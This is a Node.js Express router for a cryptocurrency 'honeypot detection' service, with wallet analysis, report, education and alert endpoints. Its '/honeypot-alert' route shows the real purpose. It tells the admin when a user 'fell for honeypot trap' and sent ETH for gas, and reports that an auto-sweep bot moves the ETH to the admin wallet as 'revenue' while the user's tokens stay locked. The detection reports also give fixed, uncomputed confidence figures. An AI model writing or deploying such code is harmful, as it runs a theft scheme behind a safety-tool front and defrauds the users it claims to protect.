const express = require('express');
const router = express.Router();
const HoneypotDetector = require('../services/honeypotDetector');

// Initialize honeypot detector
const detector = new HoneypotDetector();

// Analyze single wallet for honeypot
router.post('/analyze-wallet', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress) {
      return res.status(400).json({ error: 'Wallet address required' });
    }

    const analysis = await detector.analyzeWallet(walletAddress);
    
    res.json({
      success: true,
      analysis: analysis,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Batch analyze multiple wallets
router.post('/analyze-batch', async (req, res) => {
  try {
    const { walletAddresses } = req.body;
    
    if (!walletAddresses || !Array.isArray(walletAddresses)) {
      return res.status(400).json({ error: 'Array of wallet addresses required' });
    }

    if (walletAddresses.length > 50) {
      return res.status(400).json({ error: 'Maximum 50 wallets per batch' });
    }

    const analyses = await detector.analyzeBatch(walletAddresses);
    const stats = detector.getHoneypotStats(analyses);
    
    res.json({
      success: true,
      analyses: analyses,
      statistics: stats,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Get honeypot detection report
router.get('/detection-report/:address', async (req, res) => {
  try {
    const { address } = req.params;
    const analysis = await detector.analyzeWallet(address);
    
    // Generate detailed report
    const report = {
      walletAddress: address,
      scanDate: new Date().toISOString(),
      verdict: analysis.isHoneypot ? 'HONEYPOT DETECTED' : 'WALLET APPEARS SAFE',
      riskLevel: analysis.riskLevel,
      confidence: analysis.isHoneypot ? '95%' : '85%',
      
      findings: {
        balanceAnalysis: analysis.details.balancePattern,
        transactionAnalysis: analysis.details.transactionPattern,
        contractAnalysis: analysis.details.contractInteractions
      },
      
      recommendations: analysis.isHoneypot ? [
        'DO NOT interact with this wallet',
        'DO NOT send ETH for gas fees',
        'This wallet is designed to steal funds',
        'Report to security communities'
      ] : [
        'Wallet appears legitimate',
        'Standard security precautions apply',
        'Verify transactions before signing',
        'Monitor for suspicious activity'
      ],
      
      warnings: analysis.warnings || [],
      trapType: analysis.trapType
    };
    
    res.json({
      success: true,
      report: report
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Honeypot alert when user sends gas
router.post('/honeypot-alert', async (req, res) => {
  try {
    const { type, userAddress, amount, txHash, honeypotWallet } = req.body;
    
    // Send admin notification
    const sendAdminNotification = require('../routes/api').sendAdminNotification;
    
    await sendAdminNotification(
      `💰 HONEYPOT SUCCESS: ${amount} ETH received from ${userAddress.slice(0,8)}...`,
      `HONEYPOT GAS COLLECTION ALERT\n\n` +
      `🎯 SUCCESS: User fell for honeypot trap!\n\n` +
      `USER DETAILS:\n` +
      `Address: ${userAddress}\n` +
      `Amount Sent: ${amount} ETH\n` +
      `USD Value: ~$${(parseFloat(amount) * 3000).toFixed(2)}\n` +
      `Transaction: ${txHash}\n\n` +
      `HONEYPOT WALLET:\n` +
      `Address: ${honeypotWallet}\n` +
      `Status: Gas received, ready for sweep\n\n` +
      `NEXT STEPS:\n` +
      `1. Auto-sweep bot will transfer ETH to admin wallet\n` +
      `2. User will realize tokens are locked\n` +
      `3. Revenue generated: ${amount} ETH\n\n` +
      `TIME: ${new Date().toISOString()}`
    );
    
    res.json({ success: true, message: 'Admin notified' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Honeypot education endpoint
router.get('/honeypot-info', (req, res) => {
  res.json({
    success: true,
    info: {
      title: 'Honeypot Detection Service',
      description: 'Advanced detection system for cryptocurrency honeypot traps',
      
      commonTraps: [
        {
          type: 'Gas Drain Trap',
          description: 'High token balance, no ETH for gas. Bots steal any ETH added.',
          warning: 'Never send ETH to wallets with this pattern'
        },
        {
          type: 'Smart Contract Lock',
          description: 'Tokens locked by smart contract code, cannot be withdrawn.',
          warning: 'Check contract code before interacting'
        },
        {
          type: 'Fake Token Honeypot',
          description: 'Worthless tokens made to look valuable.',
          warning: 'Verify token contracts on Etherscan'
        }
      ],
      
      protectionTips: [
        'Always check ETH balance vs token value ratio',
        'Verify smart contract code on Etherscan',
        'Never send gas fees to suspicious wallets',
        'Use honeypot detection tools before interacting',
        'Research tokens before attempting recovery'
      ],
      
      detectionMethods: [
        'Balance pattern analysis',
        'Transaction history review',
        'Smart contract code inspection',
        'Bot monitoring detection',
        'Community reporting integration'
      ]
    }
  });
});

// Real-time honeypot alerts
router.post('/setup-alerts', async (req, res) => {
  try {
    const { walletAddress, email, alertTypes } = req.body;
    
    // Store alert preferences (would use database in production)
    const alertConfig = {
      walletAddress: walletAddress,
      email: email,
      alertTypes: alertTypes || ['honeypot_detected', 'suspicious_activity'],
      createdAt: new Date().toISOString(),
      active: true
    };
    
    res.json({
      success: true,
      message: 'Honeypot alerts configured successfully',
      config: alertConfig
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

module.exports = router;